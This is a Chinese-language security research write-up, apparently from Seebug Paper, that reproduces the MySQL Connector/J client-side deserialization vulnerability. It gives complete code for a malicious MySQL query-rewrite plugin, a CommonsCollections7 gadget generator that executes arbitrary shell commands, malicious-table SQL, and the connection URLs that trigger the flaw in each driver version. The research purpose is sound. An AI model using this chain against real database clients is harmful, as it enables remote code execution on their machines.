**作者：沈沉舟**  
**原文链接：<http://scz.617.cn:8/network/202005262206.txt>**

## 背景介绍

2019年11月底Yang Zhang等人在BlackHat上有个议题，提到MySQL JDBC客户端反序列
化漏洞，用到ServerStatusDiffInterceptor，参[1]。

2019年12月Welkin给出了部分细节，但当时未解决恶意服务端的组建问题，参[2]。

codeplutos利用修改过的MySQL插件成功组建恶意服务端，这个脑洞开得可以。与此
同时，他演示了另一条利用路径，用到detectCustomCollations。需要指出，他的方
案原理同时适用于ServerStatusDiffInterceptor、detectCustomCollations，他只 以后者举例而已。参[3]。

2020年4月fnmsd分析MySQL Connector/J各版本后给出大一统的总结，给出不同版本
所需URL，给了Python版恶意服务端，参[4]、[5]、[6]。

2020年5月我学习前几位的大作，写了这篇笔记。

## 学习思路

先将[1]、[2]、[3]、[4]、[5]、[6]全看了一遍，没做实验，只是看。对这个洞大概有点数，通
过JDBC建立到MySQL服务端的连接时，有几个内置的SQL查询语句被发出，其中两个查
询的结果集在客户端被处理时会调用ObjectInputStream.readObject()进行反序列化。
通过控制结果集，可以在客户端搞事，具体危害视客户端拥有的Gadget环境而定。

这两个查询语句是:

  * SHOW SESSION STATUS
  * SHOW COLLATION

利用MySQL插件机制将这两个查询语句在服务端"重定向"成查询恶意表，恶意表中某 字段存放恶意Object。

需要安装MySQL，创建恶意表，编译定制过的恶意MySQL插件。写一个通用的JDBC客户
端程序，用之访问恶意服务端。用Wireshark抓包，基于抓包数据用Python实现简版 恶意服务端，这样可以避免陷入MySQL私有协议细节当中。

## 搭建测试环境

参看[《恶意MySQL Server读取MySQL
Client端文件》](http://scz.617.cn/network/202001101612.txt "《恶意MySQL Server读取MySQL
Client端文件》")

## 恶意MySQL插件

### 获取MySQL 5.7.28源码

链接如下所示：<https://repo.mysql.com/yum/mysql-5.7-community/el/7/SRPMS/mysql-community-5.7.28-1.el7.src.rpm>

### 在rewrite_example基础上修改出evilreplace

    
    
    $ vi evilreplace.cc
    
    /  Copyright (c) 2015, Oracle and/or its affiliates. All rights reserved.
    
        This program is free software; you can redistribute it and/or modify
        it under the terms of the GNU General Public License, version 2.0,
        as published by the Free Software Foundation.
    
        This program is also distributed with certain software (including
        but not limited to OpenSSL) that is licensed under separate terms,
        as designated in a particular file or component or in included license
        documentation.  The authors of MySQL hereby grant you an additional
        permission to link the program and your derivative works with the
        separately licensed software that they have included with MySQL.
    
        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License, version 2.0, for more details.
    
        You should have received a copy of the GNU General Public License
        along with this program; if not, write to the Free Software
        Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
        02110-1301  USA */
    
    #include <ctype.h>
    #include <string.h>
    
    #include <my_global.h>
    #include <mysql/plugin.h>
    #include <mysql/plugin_audit.h>
    #include <mysql/service_mysql_alloc.h>
    #include <my_thread.h> // my_thread_handle needed by mysql_memory.h
    #include <mysql/psi/mysql_memory.h>
    
    /* instrument the memory allocation */
    #ifdef HAVE_PSI_INTERFACE
    static PSI_memory_key key_memory_evilreplace;
    
    static PSI_memory_info all_rewrite_memory[]=
    {
      { &key_memory_evilreplace, "evilreplace", 0 }
    };
    
    static int plugin_init(MYSQL_PLUGIN)
    {
      const char* category= "sql";
      int count;
    
      count= array_elements(all_rewrite_memory);
      mysql_memory_register(category, all_rewrite_memory, count);
      return 0; /* success */
    }
    #else
    #define plugin_init NULL
    #define key_memory_evilreplace PSI_NOT_INSTRUMENTED
    #endif /* HAVE_PSI_INTERFACE */
    
    
    static int rewrite_lower(MYSQL_THD thd, mysql_event_class_t event_class,
                             const void *event)
    {
      if (event_class == MYSQL_AUDIT_PARSE_CLASS)
      {
        const struct mysql_event_parse *event_parse=
          static_cast<const struct mysql_event_parse *>(event);
        if (event_parse->event_subclass == MYSQL_AUDIT_PARSE_PREPARSE)
        {
    #if 0
          size_t query_length= event_parse->query.length;
          char *rewritten_query=
            static_cast<char *>(my_malloc(key_memory_evilreplace,
                                           query_length + 1, MYF(0)));
    
          for (unsigned i= 0; i < query_length + 1; i++)
            rewritten_query[i]= tolower(event_parse->query.str[i]);
    
          event_parse->rewritten_query->str= rewritten_query;
          event_parse->rewritten_query->length= query_length;
          *((int *)event_parse->flags)|=
                            (int)MYSQL_AUDIT_PARSE_REWRITE_PLUGIN_QUERY_REWRITTEN;
    #else
            if
            (
                ( strcmp( event_parse->query.str, "SHOW SESSION STATUS" ) == 0 )
                ||
                ( strcmp( event_parse->query.str, "SHOW COLLATION" ) == 0 )
            )
            {
                char    evilsql[]       = "select evil_1,evil_2,evil_3 from evildb.eviltable limit 1;";
                char   *rewritten_query = static_cast<char *>
                (
                    my_malloc
                    (
                        key_memory_evilreplace,
                        strlen( evilsql ) + 1,
                        MYF(0)
                    )
                );
                strcpy( rewritten_query, evilsql );
                event_parse->rewritten_query->str       = rewritten_query;
                event_parse->rewritten_query->length    = strlen( evilsql ) + 1;
                *((int *)event_parse->flags)           |= (int)MYSQL_AUDIT_PARSE_REWRITE_PLUGIN_QUERY_REWRITTEN;
            }
    #endif
        }
      }
    
      return 0;
    }
    
    /* Audit plugin descriptor */
    static struct st_mysql_audit evilreplace_descriptor=
    {
      MYSQL_AUDIT_INTERFACE_VERSION,                    /* interface version */
      NULL,                                             /* release_thd()     */
      rewrite_lower,                                    /* event_notify()    */
      { 0,
        0,
        (unsigned long) MYSQL_AUDIT_PARSE_ALL, }        /* class mask        */
    };
    
    /* Plugin descriptor */
    mysql_declare_plugin(audit_log)
    {
      MYSQL_AUDIT_PLUGIN,             /* plugin type                   */
      &evilreplace_descriptor,    /* type specific descriptor      */
      "evilreplace",              /* plugin name                   */
      "Oracle",                       /* author                        */
      "An example of a query rewrite"
      " plugin that rewrites all queries"
      " to lower case",               /* description                   */
      PLUGIN_LICENSE_GPL,             /* license                       */
      plugin_init,                    /* plugin initializer            */
      NULL,                           /* plugin deinitializer          */
      0x0002,                         /* version                       */
      NULL,                           /* status variables              */
      NULL,                           /* system variables              */
      NULL,                           /* reserverd                     */
      0                               /* flags                         */
    }
    
    mysql_declare_plugin_end;

参考[3]，codeplutos介绍了Ubuntu 16.04下的MySQL插件编译方案。各发行版的编译过 程差别较大，RedHat
7.6上明显不同，建议先搞清楚如何编译MySQL源码，再来编译 单个插件。

编译:

    
    
    /usr/bin/c++ -DHAVE_CONFIG_H -DHAVE_LIBEVENT2 -DMYSQL_DYNAMIC_PLUGIN -D_FILE_OFFSET_BITS=64 \
    -D_GNU_SOURCE -Devilreplace_EXPORTS -Wall -Wextra -Wformat-security -Wvla -Woverloaded-virtual \
    -Wno-unused-parameter -O3 -g -fabi-version=2 -fno-omit-frame-pointer -fno-strict-aliasing -DDBUG_OFF -fPIC \
    -I/<path>/mysql-5.7.28/include \
    -I/<path>/mysql-5.7.28/extra/rapidjson/include \
    -I/<path>/mysql-5.7.28/libbinlogevents/include \
    -I/<path>/mysql-5.7.28/libbinlogevents/export \
    -isystem /<path>/mysql-5.7.28/zlib \
    -I/<path>/mysql-5.7.28/sql \
    -I/<path>/mysql-5.7.28/sql/auth \
    -I/<path>/mysql-5.7.28/regex \
    -o evilreplace.cc.o \
    -c evilreplace.cc

链接:

    
    
    /usr/bin/c++ -fPIC -Wall -Wextra -Wformat-security -Wvla -Woverloaded-virtual -Wno-unused-parameter \
    -O3 -g -fabi-version=2 -fno-omit-frame-pointer -fno-strict-aliasing -DDBUG_OFF \
    -fPIC -shared -Wl,-soname,evilreplace.so -o evilreplace.so \
    evilreplace.cc.o -lpthread \
    /<path>/libmysqlservices.a -lpthread

## 测试rewriter插件

rewriter.so是自带的插件，不需要源码编译。

### 安装rewriter.so

查看:`/usr/share/mysql/install_rewriter.sql`

除了安装rewriter.so，还涉及辅助表和存储过程的创建。

mysql> source /usr/share/mysql/install_rewriter.sql

这会多出query_rewrite库、query_rewrite.rewrite_rules表。

mysql> show plugins;

Name | Status | Type | Library | License  
---|---|---|---|---  
Rewriter | ACTIVE | AUDIT | rewriter.so | GPL  
  
mysql> SHOW GLOBAL VARIABLES LIKE 'rewriter_enabled';

Variable_name | Value  
---|---  
rewriter_enabled | ON  
  
### 在服务端替换SQL查询语句

向`query_rewrite.rewrite_rules`表中插入替换规则:

mysql> insert into query_rewrite.rewrite_rules(pattern, replacement)
values('select line from sczdb.SczTable', 'select line from sczdb.scztable
limit 1');

调用存储过程刷新，使之热生效:

mysql> call query_rewrite.flush_rewrite_rules();

测试替换规则:

mysql> select line from sczdb.SczTable;

![](https://images.seebug.org/content/images/2020/06/e249f6ff-c2fa-42c1-85f2-e682ea15d41d.png-w331s)

### 卸载rewriter.so

mysql> source /usr/share/mysql/uninstall_rewriter.sql

只有退出当前客户端才彻底卸载rewriter插件，否则其仍在生效中。

### rewriter插件的局限性

清空表，二选一，推荐后者:

  * delete from query_rewrite.rewrite_rules;
  * truncate table query_rewrite.rewrite_rules;

mysql> insert into query_rewrite.rewrite_rules(pattern, replacement)
values('SHOW SESSION STATUS', 'select * from evildb.eviltable');

mysql> select * from query_rewrite.rewrite_rules;

id | pattern | pattern_database | replacement | enabled | message |
pattern_digest | normalized_pattern  
---|---|---|---|---|---|---|---  
1 | SHOW SESSION STATUS | NULL | select * from evildb.eviltable | YES | NULL |
NULL | NULL  
  
  * mysql> call query_rewrite.flush_rewrite_rules();
  * ERROR 1644 (45000): Loading of some rule(s) failed.

调用存储过程刷新时意外失败，查看失败原因:

mysql> select message from query_rewrite.rewrite_rules;

![](https://images.seebug.org/content/images/2020/06/c5cb6c12-781b-43e3-980f-2e8e0d31d9e3.png-w331s)

pattern必须是select语句，show语句不行。

据说5.7的pattern只支持select，8.0支持insert、update、delete，未实测验证。
难怪codeplutos要修改rewrite_example.cc。

## 漏洞相关的SQL查询语句

### SHOW SESSION STATUS

    
    
    mysql> help SHOW
    ...
    SHOW COLLATION [like_or_where]
    ...
    SHOW [GLOBAL | SESSION] STATUS [like_or_where]
    ...
    If the syntax for a given SHOW statement includes a LIKE 'pattern'
    part, 'pattern' is a string that can contain the SQL % and _ wildcard
    characters. The pattern is useful for restricting statement output to
    matching values.
    
    ...

URL: <https://dev.mysql.com/doc/refman/5.7/en/show.html>

mysql> help SHOW STATUS

...

URL:<https://dev.mysql.com/doc/refman/5.7/en/show-status.html>

"SHOW SESSION STATUS"访问INFORMATION_SCHEMA.SESSION_STATUS表。参[2]，作者
说访问INFORMATION_SCHEMA.SESSION_VARIABLES表，他应该说错了。

查看INFORMATION_SCHEMA.SESSION_STATUS表结构:

mysql> select table_schema,table_name,column_name,column_type from
information_schema.columns where table_name='SESSION_STATUS';

table_schema | table_name | column_name | column_type  
---|---|---|---  
information_schema | SESSION_STATUS | VARIABLE_NAME | varchar(64)  
information_schema | SESSION_STATUS | VARIABLE_VALUE | varchar(1024)  
  
直接访问`INFORMATION_SCHEMA.SESSION_STATUS`表缺省会失败:

mysql> select VARIABLE_NAME,VARIABLE_VALUE from
INFORMATION_SCHEMA.SESSION_STATUS limit 10;

ERROR 3167 (HY000): The 'INFORMATION_SCHEMA.SESSION_STATUS' feature is
disabled; see the documentation for 'show_compatibility_56'

需要打开一个开关:

mysql> set @@global.show_compatibility_56=ON;

mysql> select * from INFORMATION_SCHEMA.SESSION_STATUS limit 10; mysql> select
VARIABLE_NAME,VARIABLE_VALUE from INFORMATION_SCHEMA.SESSION_STATUS limit 10;

VARIABLE_NAME | VARIABLE_VALUE  
---|---  
ABORTED_CLIENTS | 1  
ABORTED_CONNECTS | 0  
BINLOG_CACHE_DISK_USE | 0  
BINLOG_CACHE_USE | 0  
BINLOG_STMT_CACHE_DISK_USE | 0  
BINLOG_STMT_CACHE_USE | 0  
BYTES_RECEIVED | 2809  
BYTES_SENT | 11620  
COM_ADMIN_COMMANDS | 0  
COM_ASSIGN_TO_KEYCACHE | 0  
  
### SHOW COLLATION

mysql> help SHOW COLLATION;

...

URL: <https://dev.mysql.com/doc/refman/5.7/en/show-collation.html>

mysql> SHOW COLLATION WHERE Charset='latin1';

Collation | Charset | Id | Default | Compiled | Sortlen  
---|---|---|---|---|---  
latin1_german1_ci | latin1 | 5 |  | Yes | 1  
latin1_swedish_ci | latin1 | 8 | Yes | Yes | 1  
latin1_danish_ci | latin1 | 15 |  | Yes | 1  
latin1_german2_ci | latin1 | 31 |  | Yes | 2  
latin1_bin | latin1 | 47 |  | Yes | 1  
latin1_general_ci | latin1 | 48 |  | Yes | 1  
latin1_general_cs | latin1 | 49 |  | Yes | 1  
latin1_spanish_ci | latin1 | 94 |  | Yes | 1  
  
"SHOW COLLATION"访问INFORMATION_SCHEMA.COLLATIONS表。

查看INFORMATION_SCHEMA.COLLATIONS表结构:

mysql> select table_schema,table_name,column_name,column_type from
information_schema.columns where table_name='COLLATIONS';

table_schema | table_name | column_name | column_type  
---|---|---|---  
information_schema | COLLATIONS | COLLATION_NAME | varchar(32)  
information_schema | COLLATIONS | CHARACTER_SET_NAME | varchar(32)  
information_schema | COLLATIONS | ID | bigint(11)  
information_schema | COLLATIONS | IS_DEFAULT | varchar(3)  
information_schema | COLLATIONS | IS_COMPILED | varchar(3)  
information_schema | COLLATIONS | SORTLEN | bigint(3)  
  
可以直接访问INFORMATION_SCHEMA.COLLATIONS表，与show_compatibility_56无关。

mysql> show variables like 'show_compatibility_56';

Variable_name | Value  
---|---  
show_compatibility_56 | OFF  
  
mysql> select * from INFORMATION_SCHEMA.COLLATIONS limit 5;

COLLATION_NAME | CHARACTER_SET_NAME | ID | IS_DEFAULT | IS_COMPILED | SORTLE  
---|---|---|---|---|---  
big5_chinese_ci | big5 | 1 | Yes | Yes | 1  
big5_bin | big5 | 84 |  | Yes | 1  
dec8_swedish_ci | dec8 | 3 | Yes | Yes | 1  
dec8_bin | dec8 | 69 |  | Yes | 1  
cp850_general_ci | cp850 | 4 | Yes | Yes | 1  
  
## 复现漏洞

### GenerateCommonsCollections7.java

    
    
    /*
     * javac -encoding GBK -g -cp "commons-collections-3.1.jar" GenerateCommonsCollections7.java
     * java -cp "commons-collections-3.1.jar:." GenerateCommonsCollections7 "/bin/touch /tmp/scz_is_here" /tmp/out.bin
     */
    import java.io.*;
    import java.util.*;
    import java.lang.reflect.*;
    import javax.naming.*;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.*;
    import org.apache.commons.collections.map.LazyMap;
    
    public class GenerateCommonsCollections7
    {
        /*
         * ysoserial/CommonsCollections7
              */
            @SuppressWarnings("unchecked")
            private static Object getObject ( String cmd ) throws Exception
            {
            Transformer[]   tarray      = new Transformer[]
            {
                new ConstantTransformer( Runtime.class ),
                new InvokerTransformer
                (
                    "getMethod",
                    new Class[]
                    {
                        String.class,
                        Class[].class
                    },
                    new Object[]
                    {
                        "getRuntime",
                        new Class[0]
                    }
                ),
                new InvokerTransformer
                (
                    "invoke",
                    new Class[]
                    {
                        Object.class,
                        Object[].class
                    },
                    new Object[]
                    {
                        null,
                        new Object[0]
                    }
                ),
                new InvokerTransformer
                (
                    "exec",
                    new Class[]
                    {
                        String[].class
                    },
                    new Object[]
                    {
                        new String[]
                        {
                            "/bin/bash",
                            "-c",
                            cmd
                        }
                    }
                )
            };
            Transformer     tchain      = new ChainedTransformer( new Transformer[0] );
            Map             normalMap_0 = new HashMap();
            Map             normalMap_1 = new HashMap();
            Map             lazyMap_0   = LazyMap.decorate( normalMap_0, tchain );
            Map             lazyMap_1   = LazyMap.decorate( normalMap_1, tchain );
            lazyMap_0.put( "scz", "same" );
            lazyMap_1.put( "tDz", "same" );
            Hashtable       ht          = new Hashtable();
            ht.put( lazyMap_0, "value_0" );
            ht.put( lazyMap_1, "value_1" );
            lazyMap_1.remove( "scz" );
            Field           f           = ChainedTransformer.class.getDeclaredField( "iTransformers" );
            f.setAccessible( true );
            f.set( tchain, tarray );
            return( ht );
            }
    
        public static void main ( String[] argv ) throws Exception
        {
            String              cmd     = argv[0];
            String              out     = argv[1];
            Object              obj     = getObject( cmd );
            FileOutputStream    fos = new FileOutputStream( out );
            ObjectOutputStream  oos = new ObjectOutputStream( fos );
            oos.writeObject( obj );
            oos.close();
            fos.close();
        }
    }

`java -cp "commons-collections-3.1.jar:." GenerateCommonsCollections7
"/bin/touch /tmp/scz_is_here" /tmp/out.bin xxd -p -c 1000000 /tmp/out.bin`

输出形如:

aced00057372...3178

### 创建恶意表

    
    
    DROP TABLE IF EXISTS evildb.eviltable;
    DROP DATABASE IF EXISTS evildb;
    
    CREATE DATABASE IF NOT EXISTS evildb;
    CREATE TABLE IF NOT EXISTS evildb.eviltable
    (
        evil_1  int(5),
        evil_2  blob,
        evil_3  int(5)
    );
    
    set @obj=0xaced00057372...3178;
    
    INSERT INTO evildb.eviltable VALUES (1, @obj, 3);
    
    UPDATE evildb.eviltable SET evil_1=1, evil_2=@obj, evil_3=3;
    
    select lower(hex(evil_2)) from evildb.eviltable;
    
    SHOW GRANTS FOR root;
    GRANT ALL ON evildb.eviltable TO 'root'@'%';
    REVOKE ALL ON evildb.eviltable FROM 'root'@'%';

evil_1、evil_3也可以用blob类型，填充同样的@obj，触发点略有差异。上面演示的 恶意表是最小集，通吃。

### 用evilreplace插件改变SQL查询语句

用evilreplace插件将来自客户端的:

  * SHOW SESSION STATUS
  * SHOW COLLATION

替换成:select evil_1,evil_2,evil_3 from evildb.eviltable limit 1;

参[3]，这是codeplutos的思路，很有想像力，他用了自编译rewrite_example.so。

INSTALL PLUGIN evilreplace SONAME 'evilreplace.so';

  * SHOW SESSION STATUS;
  * SHOW COLLATION;
  * UNINSTALL PLUGIN evilreplace;

### JDBCClient.java

    
    
    /*
     * javac -encoding GBK -g JDBCClient.java
     */
    import java.io.*;
    import java.sql.*;
    
    public class JDBCClient
    {
        public static void main ( String[] argv ) throws Exception
        {
            String      url     = argv[0];
            Connection  conn    = DriverManager.getConnection( url );
        }
    }

JDBCClient.java无需显式代码:

Class.forName( "com.mysql.cj.jdbc.Driver" );

### MySQL Connector/J 各版本所需URL(ServerStatusDiffInterceptor)

参[4]、[5]、[6]，fnmsd分析了各种版本所需URL。

#### 8.x

    
    
    java \
    -cp "mysql-connector-java-8.0.14.jar:commons-collections-3.1.jar:." \
    JDBCClient "jdbc:mysql://192.168.65.23:3306/evildb?useSSL=false&user=root&password=123456&\
    autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"

##### 简化版调用关系

    
    
    DriverManager.getConnection                                         // 8u232+8.0.14
      DriverManager.getConnection                                       // DriverManager:270
        NonRegisteringDriver.connect                                    // DriverManager:664
          ConnectionImpl.getInstance                                    // NonRegisteringDriver:199
            ConnectionImpl.<init>                                       // ConnectionImpl:240
              ConnectionImpl.initializeSafeQueryInterceptors            // ConnectionImpl:448
              ConnectionImpl.createNewIO                                // ConnectionImpl:455
                ConnectionImpl.connectOneTryOnly                        // ConnectionImpl:825
                  ConnectionImpl.initializePropsFromServer              // ConnectionImpl:966
                    ConnectionImpl.handleAutoCommitDefaults             // ConnectionImpl:1327
                      ConnectionImpl.setAutoCommit                      // ConnectionImpl:1382
                        NativeSession.execSQL                           // ConnectionImpl:2064
                                                                        // 查询语句"SET autocommit=1"
                          NativeProtocol.sendQueryString                // NativeSession:1154
                            NativeProtocol.sendQueryPacket              // NativeProtocol:921
                              if (this.queryInterceptors != null)       // NativeProtocol:969
                              NativeProtocol.invokeQueryInterceptorsPre // NativeProtocol:970
                                NoSubInterceptorWrapper.preProcess      // NativeProtocol:1144
                                  ServerStatusDiffInterceptor.preProcess
                                                                        // NoSubInterceptorWrapper:76
                                    ServerStatusDiffInterceptor.populateMapWithSessionStatusValues
                                                                        // ServerStatusDiffInterceptor:105
                                      rs = stmt.executeQuery("SHOW SESSION STATUS")
                                                                        // ServerStatusDiffInterceptor:86
                                                                        // 自动提交SQL查询
                                      ResultSetUtil.resultSetToMap      // ServerStatusDiffInterceptor:87
                                        ResultSetImpl.getObject         // ResultSetUtil:46
                                                                        // mappedValues.put(rs.getObject(1), rs.getObject(2))
                                                                        // 处理结果集中第1、2列
                                          if ((field.isBinary()) || (field.isBlob()))
                                                                        // ResultSetImpl:1314
                                          byte[] data = getBytes(columnIndex)
                                                                        // ResultSetImpl:1315
                                          if (this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue())
                                                                        // ResultSetImpl:1317
                                                                        // 要求autoDeserialize等于true
                                          ObjectInputStream.readObject  // ResultSetImpl:1326
                                                                        // obj = objIn.readObject();
                                            Hashtable.readObject        // ysoserial/CommonsCollections7
                                              Hashtable.reconstitutionPut
                                                AbstractMapDecorator.equals
                                                  AbstractMap.equals
                                                    LazyMap.get         // 此处开始LazyMap利用链
                                                      ChainedTransformer.transform
                                                        InvokerTransformer.transform
                                                          Runtime.exec
                              if (this.queryInterceptors != null)       // NativeProtocol:1109
                              NativeProtocol.invokeQueryInterceptorsPost
                                                                        // NativeProtocol:1110

##### mysql-connector-java-8.0.14.pcap

请自行抓包，此处略

#### 5.2) 6.x

queryInterceptors => statementInterceptors

    
    
    java \
    -cp "mysql-connector-java-6.0.3.jar:commons-collections-3.1.jar:." \
    JDBCClient "jdbc:mysql://192.168.65.23:3306/evildb?useSSL=false&user=root&password=123456&\
    autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"

5.2.2) mysql-connector-java-6.0.3.pcap

请自行抓包，此处略

#### 5.3) 5.1.11及以上版本

com.mysql.cj. => com.mysql.

    
    
    java \
    -cp "mysql-connector-java-5.1.40.jar:commons-collections-3.1.jar:." \
    JDBCClient "jdbc:mysql://192.168.65.23:3306/evildb?useSSL=false&user=root&password=123456&\
    autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor"

##### 5.3.2) mysql-connector-java-5.1.40.pcap

请自行抓包，此处略

#### 6) MySQL Connector/J 各版本所需URL(detectCustomCollations)

参[3]，触发方式是codeplutos提供的。重点看这个函数:

com.mysql.jdbc.ConnectionImpl.buildCollationMapping()

参[4]、[5]、[6]，fnmsd分析了各种版本所需URL。

##### 6.1) 5.1.29-5.1.40

    
    
    java \
    -cp "mysql-connector-java-5.1.40.jar:commons-collections-3.1.jar:." \
    JDBCClient "jdbc:mysql://192.168.65.23:3306/evildb?useSSL=false&user=root&password=123456&\
    autoDeserialize=true&detectCustomCollations=true"

会抛异常，但恶意代码已被执行。

##### 6.1.1) 简化版调用关系

    
    
    DriverManager.getConnection                                         // 8u232+5.1.40
      DriverManager.getConnection                                       // DriverManager:270
        NonRegisteringDriver.connect                                    // DriverManager:664
          ConnectionImpl.getInstance                                    // NonRegisteringDriver:328
            Util.handleNewInstance                                      // ConnectionImpl:410
              Constructor.newInstance                                   // Util:425
                JDBC4Connection.<init>
                  ConnectionImpl.<init>                                 // JDBC4Connection:47
                    ConnectionImpl.initializeSafeStatementInterceptors  // ConnectionImpl:805
                    ConnectionImpl.createNewIO                          // ConnectionImpl:806
                      ConnectionImpl.connectOneTryOnly                  // ConnectionImpl:2083
                        ConnectionImpl.initializePropsFromServer        // ConnectionImpl:2297
                          if (versionMeetsMinimum(3, 21, 22))           // ConnectionImpl:3282
                          ConnectionImpl.buildCollationMapping          // ConnectionImpl:3291
                            if ((versionMeetsMinimum(4, 1, 0)) && (getDetectCustomCollations()))
                                                                        // ConnectionImpl:944
                                                                        // 5.1.28版只检查版本号，未检查detectCustomCollations属性
                            results = stmt.executeQuery("SHOW COLLATION")
                                                                        // ConnectionImpl:957
                                                                        // 自动提交SQL查询
                            if (versionMeetsMinimum(5, 0, 0))           // ConnectionImpl:958
                            Util.resultSetToMap                         // ConnectionImpl:959
                                                                        // Util.resultSetToMap(sortedCollationMap, results, 3, 2)
                                                                        // 处理结果集中第3、2列
                              ResultSetImpl.getObject                   // Util:474
                                                                        // mappedValues.put(rs.getObject(key), rs.getObject(value))
                                ResultSetImpl.getObjectDeserializingIfNeeded
                                                                        // ResultSetImpl:4544
                                  byte[] data = getBytes(columnIndex)   // ResultSetImpl:4568
                                  ObjectInputStream.readObject          // ResultSetImpl:4579
                                                                        // obj = objIn.readObject()
                                    Hashtable.readObject                // ysoserial/CommonsCollections7
                                      Hashtable.reconstitutionPut
                                        AbstractMapDecorator.equals
                                          AbstractMap.equals
                                            LazyMap.get                 // 此处开始LazyMap利用链
                                              ChainedTransformer.transform
                                                InvokerTransformer.transform
                                                  Runtime.exec

##### 6.1.2) mysql-connector-java-5.1.40_d.pcap

请自行抓包，此处略

#### 6.2) 5.1.19-5.1.28

不需要指定"detectCustomCollations=true"

java \ -cp "mysql-connector-java-5.1.19.jar:commons-collections-3.1.jar:." \
JDBCClient
"jdbc:mysql://192.168.65.23:3306/evildb?useSSL=false&user=root&password=123456&\
autoDeserialize=true"

##### 6.2.2) mysql-connector-java-5.1.19_d.pcap

请自行抓包，此处略

### 7) Python版恶意服务端

#### 7.1) fnmsd的实现

<https://github.com/fnmsd/MySQL_Fake_Server>他这个实现同时支持ServerStatusDiffInterceptor、detectCustomCollations，还
支持"恶意MySQL Server读取MySQL Client端文件"，只需要Python3。

他在"踩过的坑"里写了一些值得注意的点，有兴趣者可以看他的源码。

#### 7.2) 其他思路

fnmsd的实现，功能完备。如果只是想搞标题所说漏洞，我说个别的思路。可以基于
Gifts版本实现反序列化恶意服务端:<https://github.com/Gifts/Rogue-MySql-Server>

ServerStatusDiffInterceptor适用范围包含detectCustomCollations适用范围，为
了减少麻烦，可以只支持ServerStatusDiffInterceptor。具体来说，就是只特殊响 应"SHOW SESSION
STATUS"，不特殊响应"SHOW COLLATION"。

基于三次抓包组织响应报文:

mysql-connector-java-5.1.40.pcap  
mysql-connector-java-6.0.3.pcap  
mysql-connector-java-8.0.14.pcap

要点如下:

    
    
    5.1.11及以上版本
    6.x
    
        特殊响应"SHOW SESSION STATUS"，然后必须特殊响应随后而来的
        "SHOW WARNINGS"。
    
    8.x
    
        按抓包所示响应初始查询:
    
        /* mysql-connector-java-8.0.14 (Revision: 36534fa273b4d7824a8668ca685465cf8eaeadd9) */SELECT ...
    
        然后按抓包所示响应随后而来的"SHOW WARNINGS"。
    
        特殊响应"SHOW SESSION STATUS"，然后必须特殊响应随后而来的
        "SHOW WARNINGS"。

这种搞法的好处是不用特别理解MySQL私有协议，fnmsd"踩过的坑"你都不会碰上。

十多年前我们按协议规范组织SMB报文时，有天看到某人在PoC里用了一个变量名，叫
sendcode，他实际是把Ethereal抓包看到数据直接投放出来。当时我们很震惊，不是 佩服得震惊。后来觉得某些场景下这样干，也没什么可鄙视的。

基于三次抓包组织响应报文的思路，跟sendcode异曲同工，比你想像得要通用。

当然，如果不是特别好奇，还是用fnmsd的实现吧。

## 参考链接

  1. <https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf>

  2. <https://www.cnblogs.com/Welk1n/p/12056097.html>

  3. <https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload>

  4. <https://www.anquanke.com/post/id/203086>

  5. <https://blog.csdn.net/fnmsd/article/details/106232092>

  6. <https://github.com/fnmsd/MySQL_Fake_Server>

  7. <https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-jdbc-url-format.html>

  8. <https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html>

  9. <https://dev.mysql.com/doc/refman/5.7/en/show-plugins.html>

  10. <https://dev.mysql.com/doc/refman/5.7/en/status-table.html>

  11. <https://dev.mysql.com/doc/internals/en/com-query-response.html>

  12. <https://dev.mysql.com/doc/internals/en/binary-protocol-value.html>

  13. <https://dev.mysql.com/doc/internals/en/protocoltext-resultset.html>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1227/>

